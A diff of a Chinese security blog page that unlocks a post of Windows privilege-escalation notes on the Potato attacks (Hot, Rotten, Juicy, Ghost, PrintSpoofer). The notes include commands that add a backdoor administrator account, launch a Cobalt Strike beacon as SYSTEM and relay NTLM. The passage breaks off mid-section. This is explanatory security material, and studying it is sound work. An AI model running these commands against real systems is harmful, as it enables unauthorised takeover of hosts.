@@ -23,19 +23,26 @@
   <meta name="author" content="dr0n">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
+    <meta name="description" content="土豆家族原理可以与域渗透学习(NTLM篇)的内容结合起来看 一般使用 Potato 提权需要下列两个特权中的一个  SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege  以下用户拥有SeImpersonatePrivilege权限，而 SeAssignPrimaryTokenPrivilege 只有更高权限的账户比如SYSTEM才有 12345">
 <meta property="og:type" content="article">
 <meta property="og:title" content="windows提权笔记">
 <meta property="og:url" content="https://www.dr0n.top/posts/a04618bd/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
+<meta property="og:description" content="土豆家族原理可以与域渗透学习(NTLM篇)的内容结合起来看 一般使用 Potato 提权需要下列两个特权中的一个  SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege  以下用户拥有SeImpersonatePrivilege权限，而 SeAssignPrimaryTokenPrivilege 只有更高权限的账户比如SYSTEM才有 12345">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/potato-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/potato-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/potato-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/potato-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-14.png">
 <meta property="article:published_time" content="2024-10-11T04:00:00.000Z">
-<meta property="article:modified_time" content="2025-08-23T14:19:46.082Z">
+<meta property="article:modified_time" content="2025-09-04T16:25:05.544Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/potato-1.png">
   
   
   
@@ -330,7 +337,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          146 字
+          3.5k 字
         
       </span>
     
@@ -341,7 +348,7 @@
         
         
         
-          1 分钟
+          24 分钟
         
       </span>
     
@@ -390,22 +397,286 @@
             <h1 id="seo-header">windows提权笔记</h1>
             
             
-              
-              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="984ad40030d51d161a7ccbb520e4c4008138fa5cbbe6b8eaa3ddb1f713d3753d">d53f41d2c7ee3b58c8999934d306edce22c71ecac700bd8e6517dad81c6abf7004a5f045b9e04b440c9cc8bb2ccc6c06104271ce939348ace633475ee77327ff47d368a6da817cd522beab6bc8b6eaa61ccfeb128b10667cb74428aba9db02629552d90ca25e8d0937f9c1d8c83773e7b00866483d6a72bc9ee897af26406cb28908619e142bc43ebb6b69c5f674f9d5aa646e92955b848e257d30e9b152a239335b9783df2f4c03c5b11b88c02f24ce3bdfe2ce143b543d5f6e188ce154ceee4d9a42915129274fc9130d84000ac6d875cc96ee166ba8ef88f1bb964891db62ea5f1b0139b7bc19e14a57a396bb720c9f17bd5983aa66e68959b0f04850dd7350a89cbb7c27777aa0ca3198fdd158f76ff9b0eae0203da8ccab7f1b4b3e94fcdbb5e338111480f515c143ea13f62fd23142a544098d6a2747472a80c1a9e202376c3def08c6c4ec645314f3e3f1b0aa6b255216c7db31594eab3cf404777b3e0c5fb1661b5ab7a6f96cf184e94c31b3370774cbb3c137bbaa2d006d54cd42b0b7e19624e5fe791f1584de10413c4fccc31e2bd386e8b1a125736f4681ee98a6aa06f24ce8cce752661ed60b5a8b3499edd35f2f4494ac3995d9241994a3c2aebe228607f29847ba16ee0df89a1b49a157e3c2159ff5cf6b76c22786d72a24d0edb52e8873b333c9c6200c0ad1595d69e0327f1b12f011164a076a88ab43e3af404c15ef7923f984bc395ff9193d61a8b7555a3891b02c7faec30306a324ad76e7441263d7a34c282f5eaf1f412d01e4465380d75fdbb1c8752ee7e2e193c522a32544cdc47076794153b7698c61817ea384971d595f7b005b851edf978bf2f425407765452166908c43747856ec8973f0d0b363953403db7440d323d652cc292a3aee4ac3559b97e4c0ccbb1ffcd512dc6dead29118efde60f12b6d3ed507746b7c4ffa397ae12900b3d9386ef29397fef1b6039dde67373718d93d74c699c5c7883aa836debecdc6552668c31111bd79054298d0433feffc2b8fd51c88e60510a2f5e86b5f5d482d7d3290665f671e24c9d01d82d7d1527bf1fa98b8041e92411e86dfb67c9948c4047833ac6e16c51cbfd394c773feaab7843962e2218ab0f496e038e734c41dbf2a1e341248c8cd68d90f7a73cdd1d9e0777ce8b4e2e73ecdfeb3119557770724dee546bf47c9cb3e45009d90ec15107f2ff47dfdcf143cd497c60a07261d266e79690e92fe405411b492a80ec9e193dbd07cb13d1feacd38d5d41ba8f5a448ff765e4bb24b58642021dd3ffb45c439bedbaf493995fed1bc086e112f11b0d3f17d45cd7f0c57b7222574bfbcb23ac2eeb10bb19e075a12b45538c27eaf264649f3d017e92103017fab9b7372283165b6cd79a31af5768e9e1fe1299e18272df27dad4c2c94fafd248bcee58b9f80460da12b523cc79f26494de647fe268dc2984b63405804496451e43eda8dbf725f3df40e469e155c235f1a38cac448cadd2a634f12a9862fbd11ed469bc8e88bf0c1a63887f1d75c885cf793270690de16930360e78a7eab08b2b198f1642f43928c727bc2d4fb96d1b637f41b4f222a8a0de21561476501fad368a216aadc7f4dab8bc8c876d9e053a3eafd6336dc8d5e63469c57b018540a3c0e87d4cb467c6f746ef973982e629b314adedf0c92c542bf48bf15b4d73e29552580d1585193999c2bf48f9610737403dd8eb427ea461d12434765bca6d0ef8d03cf8b8158e93d961e07cc46a60e26d43fca2000191c5c769e648dd89aa09fa8583c718061c2e413db574311698e6b845a63436ee023ea3663a83548a8d1a03f50ba4cac28aca4390ff43425c74ac367a45e5da18b544ca835c5c79a8e3c13c89e13a2b5e17b20e8790e5595939f0397d2da68c76c4bc2fd54d8c559c290b6e44ed7ba2be11c9f59b2f4a76c0d7c6b0c30784b0d8128842877046764de2923dbc4d214573726f9d5c48ac803352360950aaddd8dab6b171482d3ea44216cdc52d670d79351c7b67d612d5522ee28524d8026d3b853adb8e5951b7f36971eedb4b47fee1b9ed04d9d5888044a684bef52f4f3cb29c45bf6c7a383468879e9b35f777881565e90b2535570175193a4b7fd5795eef7c3948522356a1656aa6aaaf2f5b1ef446e186a2792b4993c11e478b6d48d4e4a0870e26ab0b758b9141a032482ffba92357021bce461c15cd70d0d4f34c8c344ac1eaa48c373de615737693c81fe490a36909b38862591e674a2a1ff6d645356e2d5db2ef151438ef526a19b2918d453d5e860cb42f2b500c268ef5955b65cec9e72b904d51b83e7c4d9e8dbfce5de53825b57eca29e159184645e4ed57891665769bdb1790ae23e3fdb4df310804c84043e311a96e718d61821ca1fba009a8b79bf2cb2993aeb0923308c56cc2699ae29102b7bba357a304feac910d78a8c2152dfd71e9581029ef4e50f03bf850198e8da26138fe2330e9fe417bc1164d5b3a0733743d3de96727c702bec336c3d1013deecb5709c682e6132a460a203a0b7281e0fd654617d5cf0660f3a00ddbb51d5e99b5b5d5975664095e48e92d3307dced5f7da08e7243f867cf1546e9c942bcce67de547186e06d557516e7af3f7eb60b40a748891df3d00fed0c4025515cb5611daa8977dcdc974e8b7283a239c7a79061acf60c40e22b2a4ede81fd0aa311f4c27c68b3097ac1087eac61bde2fea30644cd7b793141595f35ba8a1a5f754ee26337ffb01b1cac3ac4198e28e0eb71d01de09af6b2f0d8c2bbc8e6e1d3ef89173027383767170a157e8924766e4dbb12036da9b8a650135b01d4f3fc6b49578924b539d5798b64663307eaa53a3622f42d4e887e1573492da4e0455ccccb4e553226d2465f90fd792a21ae9ba0e771958b51a4a070c3ae396029189ab8d1e71f66fcc7de717cc37f8e0d08934216a67e0e3f6993a37ad419b89fbd078e2ea6fd77104c2f2bf069322db7b54fbe1d6a2204ada336e0b7b574777ae6411a3e0002257c21d4e5ce267007eac4a851cc75f1a3fa1b730b62ba027845731afe08d7af223fefd06785e44c46e1d482bc8cb892c7e3a63166c75d2d7c5a7d59702a9436f406600e83f57b175e0393f4e9313df38a0dace6b26cc78018901de05ffc5aa14679fa9c4be651d2471</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
-              
+              <div class="markdown-body">
+                
+                <h1 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h1><p>原理可以与<a href="/posts/3f5b8fbe/">域渗透学习(NTLM篇)</a>的内容结合起来看</p>
+<p>一般使用 Potato 提权需要下列两个特权中的一个</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryTokenPrivilege</li>
+</ul>
+<p>以下用户拥有SeImpersonatePrivilege权限，而 SeAssignPrimaryTokenPrivilege 只有更高权限的账户比如SYSTEM才有</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">- 本地管理员账户（不包括管理员组普通账户）和本地服务帐户<br>- 由SCM启动的服务<br>- Local System (NT AUTHORITY\SYSTEM)<br>- Network Service (NT AUTHORITY\Network Service)<br>- Local Service (NT AUTHORITY\Local Service)<br></code></pre></td></tr></table></figure>
 
-              
+<p>也就是说平时通过<strong>服务</strong>（IIS，mssql等）拿下的账户在操作时是一个低权限账户，但是可以通过这个提权方式获得 SYSTEM 权限</p>
+<h2 id="Hot-Potato-MS16-075"><a href="#Hot-Potato-MS16-075" class="headerlink" title="Hot Potato(MS16-075)"></a>Hot Potato(MS16-075)</h2><p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a><br>PowerShell 实现：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理是利用 NBNS 欺骗、WPAD 代理劫持 和 HTTP→SMB NTLM 中继 实现权限提升，最终以 NT AUTHORITY\SYSTEM 权限执行任意命令</p>
+<ol>
+<li><p>NBNS 欺骗</p>
+<ul>
+<li>当系统无法通过 hosts 文件或 DNS 解析域名时，会在本地网络广播 NBNS 查询请求</li>
+<li>攻击者伪造 NBNS 响应，将 wpad 主机名指向 127.0.0.1，并通过暴力枚举 TXID（65536 种可能）实现匹配</li>
+<li>若系统已有 DNS 缓存记录，可以通过 耗尽 UDP 端口（令每个端口失效）迫使 DNS 查询失败，从而回退到 NBNS</li>
+</ul>
+</li>
+<li><p>伪造 WPAD 代理服务器</p>
+<ul>
+<li>Windows（IE 及部分系统服务，如 Windows Update）默认会尝试访问 <a target="_blank" rel="noopener" href="http://wpad/wpad.dat">http://wpad/wpad.dat</a> 获取 PAC 代理配置</li>
+<li>在本地 127.0.0.1 运行 HTTP 服务器并返回恶意 PAC：</li>
+<li>该配置将目标上的 HTTP 流量强制经由本地代理（127.0.0.1）</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FindProxyForURL</span>(<span class="hljs-params">url, host</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">dnsDomainIs</span>(host, <span class="hljs-string">&quot;localhost&quot;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECT&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PROXY 127.0.0.1:80&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>HTTP → SMB NTLM 中继<ul>
+<li>控制的本地 HTTP 服务器对特定 URL（如<a target="_blank" rel="noopener" href="http://localhost/GETHASHESxxxxx%EF%BC%89%E8%BF%94%E5%9B%9E">http://localhost/GETHASHESxxxxx）返回</a> 401，触发 NTLM 认证</li>
+<li>捕获到的 NTLM 凭据被 中继 到本地 SMB 服务，从而创建高权限的系统服务并执行用户定义命令</li>
+<li>当发起请求的是高权限（如 windows update 以 SYSTEM 权限运行）时，就完成了提权</li>
+</ul>
+</li>
+</ol>
+<p><img src="/img/%E5%86%85%E7%BD%91/potato-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>Win7 利用 - Windows Defender 更新机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Potato.exe -ip &lt;<span class="hljs-built_in">local</span> ip&gt; -cmd &lt;<span class="hljs-built_in">command</span> to run&gt; -disable_exhaust <span class="hljs-literal">true</span><br><br>Potato.exe -ip 192.168.100.177 -cmd <span class="hljs-string">&quot;C:\\Windows\\System32\\cmd.exe /k net user test test /add &amp;&amp; net localgroup administrators test /add&quot;</span> -disable_exhaust <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>Win Server 2008 利用 - Windows Update 机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Potato.exe -ip &lt;<span class="hljs-built_in">local</span> ip&gt; -cmd &lt;<span class="hljs-built_in">command</span> to run&gt; -disable_exhaust <span class="hljs-literal">true</span> -disable_defender <span class="hljs-literal">true</span> --spoof_host WPAD.EMC.LOCAL<br></code></pre></td></tr></table></figure>
+
+
+<p>Windows 8&#x2F;10&#x2F;Server 2012 - 自动更新机制，该机会每天下载证书信任列表(CTL)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Potato.exe -ip &lt;<span class="hljs-built_in">local</span> ip&gt; -cmd &lt;cmd to run&gt; -disable_exhaust <span class="hljs-literal">true</span> -disable_defender <span class="hljs-literal">true</span><br><br>Potato.exe -ip 192.168.100.150 -cmd <span class="hljs-string">&quot;C:\\Windows\\System32\\cmd.exe /k net user test test /add&quot;</span> -disable_exhaust <span class="hljs-literal">true</span> -disable_defender <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+
+<p>如果网络中已存在 WPAD 的 DNS 条目，可以尝试设置 <code>-disable_exhaust false</code>，这会导致 DNS 查找失败，并回退到 NBNS</p>
+<h2 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2><p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a><br><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
+<p>Rotten Potato 允许攻击者在具备 <code>SeImpersonatePrivilege</code> 权限的情况下，从服务账户提权到 <strong>NT AUTHORITY\SYSTEM</strong>。与 Hot Potato 相比，它更加可靠、即时触发，并且不依赖 NBNS 或 WPAD 等网络欺骗手段</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li>诱使 SYSTEM 账户进行 NTLM 身份验证，通过特定 COM 调用，让 SYSTEM 账户向攻击者控制的本地 TCP 端口发起 NTLM 认证</li>
+<li>中继 NTLM 身份验证至本地 RPC，充当中间人，将 SYSTEM 发起的认证过程与本地 API 调用关联，从而生成 SYSTEM 令牌</li>
+<li>模拟 SYSTEM 身份，调用 <code>ImpersonateSecurityContext</code> 使用获取的令牌，执行提权操作</li>
+</ol>
+<p><img src="/img/%E5%86%85%E7%BD%91/potato-2.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h3><ol>
+<li><strong>使用 CoGetInstanceFromIStorage 触发 DCOM 认证</strong></li>
+</ol>
+<p>Rotten Potato 通过调用 <code>CoGetInstanceFromIStorage</code> API 触发 DCOM 请求。示例代码如下：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BootstrapComMarshal</span>()</span><br>&#123;<br>    IStorage stg = ComUtils.CreateStorage();<br><br>    <span class="hljs-comment">// 使用已知的本地系统服务 COM 服务器，这里以 BITSv1 为例</span><br>    Guid clsid = <span class="hljs-keyword">new</span> Guid(<span class="hljs-string">&quot;4991d34b-80a1-4291-83b6-3328366b9097&quot;</span>);<br><br>    <span class="hljs-comment">// 指定目标 IP 和端口，这里为本地监听 6666</span><br>    TestClass c = <span class="hljs-keyword">new</span> TestClass(stg, String.Format(<span class="hljs-string">&quot;&#123;0&#125;[&#123;1&#125;]&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">6666</span>));<br><br>    MULTI_QI[] qis = <span class="hljs-keyword">new</span> MULTI_QI[<span class="hljs-number">1</span>];<br>    qis[<span class="hljs-number">0</span>].pIID = ComUtils.IID_IUnknownPtr;<br>    qis[<span class="hljs-number">0</span>].pItf = <span class="hljs-literal">null</span>;<br>    qis[<span class="hljs-number">0</span>].hr = <span class="hljs-number">0</span>;<br><br>    CoGetInstanceFromIStorage(<span class="hljs-literal">null</span>, <span class="hljs-keyword">ref</span> clsid, <span class="hljs-literal">null</span>, CLSCTX.CLSCTX_LOCAL_SERVER, c, <span class="hljs-number">1</span>, qis);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此调用会让 COM 尝试从 127.0.0.1:6666 加载对象。由于 DCOM 使用 RPC 协议通信，攻击者在 6666 端口上运行代理程序，接收并转发数据包至本地 RPC 监听端口 135</p>
+<ol start="2">
+<li><strong>中继 RPC 数据包</strong></li>
+</ol>
+<p>攻击者充当”中间人”角色：</p>
+<ul>
+<li>将 COM 发送到 6666 端口的请求转发到 135 端口</li>
+<li>将 RPC 返回的数据作为模板，响应给 COM</li>
+<li>通过这种方式避免了复杂的协议重构，并确保在不同 Windows 版本下兼容</li>
+</ul>
+<p>在 NTLM 认证开始之前，这些数据包主要用于建立 RPC 会话</p>
+<ol start="3">
+<li><strong>NTLM 认证流程</strong></li>
+</ol>
+<ul>
+<li>Type 1 (Negotiate)：客户端（SYSTEM 账户）发起认证请求</li>
+<li>Type 2 (Challenge)：服务端（攻击者代理）返回 Challenge 数据，此时必须修改数据包中的 NTLM Blob，尤其是”Server Challenge”和”Reserved”字段，以匹配通过 AcceptSecurityContext API 调用生成的值（如果不修改，后续认证会失败，因为系统会认为这是 RPC 而非攻击者代理）</li>
+<li>Type 3 (Authenticate)：客户端返回认证数据（此处通常为空），随后攻击者完成本地安全上下文建立</li>
+</ul>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>原作者的实现基于meterpreter shell</p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wK0r-TZR7w8&t=87s">Rotten Potato - IIS Privilege Escalation</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=3CPdKMeB0UY&t=66s">Rotten Potato - MSSQL Privilege Escalation</a></p>
+<p>或者使用上面贴出来的NG版本，不过需要修改 MSFRottenPotato.cpp 文件并重新编译，默认运行后弹出一个 cmd.exe</p>
+<blockquote>
+<p>Lonely Potato 是 Rotten Potato 的改编 webshell 版，不依赖 meterpreter 和 incognito 模块，不过现在已被弃用</p>
+</blockquote>
+<h2 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h2><p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
+<p>Juicy Potato 是 Rotten Potato 的改进和增强版，二者都利用了 Windows COM&#x2F;DCOM 与 RPC 机制进行提权，但 Juicy Potato 针对 Rotten Potato 的局限性进行了突破，使利用方式更加灵活与通用</p>
+<h3 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h3><p>Rotten Potato 的核心思路是利用 BITS (Background Intelligent Transfer Service) 作为 COM 对象触发高权限 NTLM 认证，再通过本地 relay 实现提权，但它存在两个主要限制：</p>
+<ol>
+<li>依赖单一 CLSID：只能使用 BITS {4991d34b-80a1-4291-83b6-3328366b9097} ，一旦被禁用即失效</li>
+<li>端口固定：Poc 依赖端口 6666，在端口被占用或被安全策略限制时无法利用</li>
+</ol>
+<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>Juicy Potato 在 Rotten Potato 的基础上做了两个关键改进：</p>
+<ol>
+<li><p>支持任意 CLSID</p>
+<ul>
+<li>不再局限于 BITS，攻击者可以选择任意满足条件的 COM 对象：<ul>
+<li>可由当前用户实例化（具备模拟权限的服务用户）</li>
+<li>实现 IMarshal 接口</li>
+<li>在高权限账户（SYSTEM、Administrator）下运行</li>
+</ul>
+</li>
+<li>研究者整理了可利用的 CLSID 列表：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">CLSID 列表</a></li>
+</ul>
+</li>
+<li><p>可自定义监听端口</p>
+<ul>
+<li>不再固定为 <code>6666</code>，攻击者可指定任意端口，提高了利用灵活性与成功率</li>
+</ul>
+</li>
+</ol>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">T:\&gt;JuicyPotato.exe<br>JuicyPotato v0.1<br><br>必选参数:<br>-t 指定创建进程时使用的 API 调用方式: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both<br>-p &lt;program&gt;: 指定要运行的程序路径<br>-l &lt;port&gt;: COM 服务器监听的本地端口，用于接收高权限服务的 RPC 请求<br><br><br>可选参数:<br>-m &lt;ip&gt;: COM 服务器监听的 IP 地址 (default 127.0.0.1)<br>-a &lt;argument&gt;: 传递给 -p 指定程序的参数 (default NULL)<br>-k &lt;ip&gt;: RPC 服务器的目标 IP 地址 (default 127.0.0.1)<br>-n &lt;port&gt;: RPC 服务器的端口 (default 135)<br>-c &lt;&#123;clsid&#125;&gt;: 指定要利用的 COM 对象 CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)<br>-z 仅用于测试 CLSID，打印获得的 token 所属用户，但不执行命令<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 2012 上线cs</span><br>JuicyPotato.exe -l 1337 -p <span class="hljs-string">&quot;C:\Users\Public\beacon.exe&quot;</span> -t * -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/potato-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>批量调用 Juicy Potato，遍历 CLSID，打印获得的 token 所属用户</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br>:: Starting port, you can change it<br><span class="hljs-built_in">set</span> /a port=<span class="hljs-number">10000</span><br><span class="hljs-built_in">SETLOCAL</span> ENABLEDELAYEDEXPANSION<br><br><span class="hljs-keyword">FOR</span> /F <span class="hljs-variable">%%i</span> <span class="hljs-keyword">IN</span> (CLSID.list) <span class="hljs-keyword">DO</span> (<br>   <span class="hljs-built_in">echo</span> <span class="hljs-variable">%%i</span> <span class="hljs-variable">!port!</span><br>   juicypotato.exe -z -l <span class="hljs-variable">!port!</span> -c <span class="hljs-variable">%%i</span> &gt;&gt; result.log<br>   <span class="hljs-built_in">set</span> RET=<span class="hljs-variable">!ERRORLEVEL!</span><br>   :: <span class="hljs-built_in">echo</span> <span class="hljs-variable">!RET!</span><br>   <span class="hljs-keyword">if</span> &quot;<span class="hljs-variable">!RET!</span>&quot; == &quot;<span class="hljs-number">1</span>&quot;  <span class="hljs-built_in">set</span> /a port=port+<span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/potato-4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Ghost-Potato"><a href="#Ghost-Potato" class="headerlink" title="Ghost Potato"></a>Ghost Potato</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/GhostPotato">https://github.com/Ridter/GhostPotato</a></p>
+<p>Ghost Potato (CVE-2019-1384) 利用 NTLM 缓存机制绕过 MS08-068，重新实现本地 NTLM 反射</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>MS08-068&#x2F;MS09-13 补丁通过在 InitializeSecurityContext 调用时指定 <code>pszTargetName</code> 来引入 Challenge 缓存，以防止反射<br>Ghost Potato 的核心是利用缓存过期（300 秒）与触发缓存清理逻辑的时机，延迟发送 Type3，达到绕过效果</p>
+<ol>
+<li>主机 A 访问主机 B 时发起 SMB 认证，<code>pszTargetName</code> 设置为 <code>cifs/B</code>，在 Type2 阶段，主机 A 接收到 B 的 Challenge 并缓存 (Challenge, cifs&#x2F;B) 至 LSASS</li>
+<li>主机 B 在收到主机 A 的 Type3 后，会检查 LSASS 缓存中是否存在 (Challenge, cifs&#x2F;B)。若存在，认证失败</li>
+<li>如果 A 与 B 是同一主机，则缓存必然存在，导致认证失败。若为不同主机，则缓存不存在，认证可能成功</li>
+<li>该缓存 300 秒后自动失效。攻击者只需等待 300 秒后再发送 Type3，即可绕过检查完成反射</li>
+</ol>
+<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>修改版 <code>ntlmrelayx.py</code> 实现了 Ghost Potato 攻击：<br><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> impacket-ghostpotato/examples<br>python3 ntlmrelayx.py -t smb://192.168.100.150 -smb2support --gpotato-startup /root/test/beacon.exe<br></code></pre></td></tr></table></figure>
+
+<p>Responder配合监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">responder -I eth0 --lm<br></code></pre></td></tr></table></figure>
+
+<p>使用ie访问触发，经过 315 秒后 beacon.exe 会自动上传文件到 Windows 启动目录</p>
+<h2 id="PrintSpoofer-PipePotato-or-BadPotato"><a href="#PrintSpoofer-PipePotato-or-BadPotato" class="headerlink" title="PrintSpoofer (PipePotato or BadPotato)"></a>PrintSpoofer (PipePotato or BadPotato)</h2><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
+<p>PrintSpoofer 最早在 2020 年 5 月由国外研究员公开，其原理利用打印服务进程 <strong>spoolsv.exe</strong> 的 RPC 接口进行提权。后续，360 的论文将其称为 <strong>PipePotato</strong>，而 GitHub 上的国人 POC 则叫 <strong>BadPotato</strong></p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Windows 打印服务（Print Spooler）通过命名管道 <code>\\.\pipe\spoolss</code> 对外提供 RPC 接口，默认启用<br>其中关键函数为：</p>
